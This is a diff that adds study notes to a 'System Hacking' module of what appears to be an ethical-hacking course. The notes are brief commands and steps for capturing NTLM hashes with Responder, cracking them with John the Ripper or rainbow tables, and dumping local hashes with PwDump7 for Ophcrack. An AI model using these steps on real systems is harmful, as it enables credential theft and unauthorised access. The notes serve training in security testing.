@@ -2,6 +2,30 @@
 
 ## Module 06 - System Hacking
 
+**NTLM Hash crack :**
+
+* esponder -I eth0
+* usr\share\responder\logs --> Responder log location
+* john /usr/share/responder/logs/ntlm.txt
+
+**Rainbow table crack using Winrtgen :**
+
+* Open winrtgen and add new table
+* Select ntlm from Hash dropdown list.
+* Set Min Len as 4, Max Len as 6 and Chain Count 4000000
+* Select loweralpha from Charset dropdown list (it depends upon Password).
+* rcrack\_gui.exe to crack hash with rainbow table
+
+**Hash dump with Pwdump7 and crack with ophcrack :**
+
+* `wmic useraccount get name,sid` --> Get user acc names and SID
+* PwDump7.exe > c:\hashes.txt
+* Replace boxes in hashes.txt with relevant usernames from step 1.
+* Ophcrack.exe -> load -> PWDUMP File
+* Tables -> Vista free -> select the table directory -> crack
+
+###
+
 ### **Lab1 - Task1: Perform Active Online Attack to Crack the System's Password using Responder**
 
 * **Linux:**
